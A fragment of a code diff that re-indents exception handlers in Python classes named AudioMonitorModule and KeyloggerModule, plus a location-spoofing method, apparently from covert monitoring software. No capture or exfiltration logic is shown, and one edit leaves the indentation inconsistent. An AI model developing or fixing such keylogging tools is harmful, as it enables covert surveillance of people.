@@ -132,7 +132,7 @@ class AudioMonitorModule(object):
              try:
                  with open(DEFAULT_LOG_FILE, 'a') as f:
                      f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Audio Error: {str(e)}\n")
-                 except: pass
+             except: pass
 
 class KeyloggerModule(object):
     def on_keydown(self, key_event=None):
@@ -144,7 +144,7 @@ class KeyloggerModule(object):
              try:
                  with open(DEFAULT_LOG_FILE, 'a') as f:
                      f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Keylogger Error: {str(e)}\n")
-                 except: pass 
+             except: pass 
 
     def mask_location(self): # Moved method inside class for consistency or keep global if preferred. Here keeping logic simple.
          """Randomizes location coordinates to hide real GPS."""
@@ -159,7 +159,7 @@ class KeyloggerModule(object):
 
             print("  [!] Location Spoofed Successfully.")
             
-        except Exception as e:
+         except Exception as e:
              try:
                  with open(DEFAULT_LOG_FILE, 'a') as f:
                      f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Loc Error: {str(e)}\n")
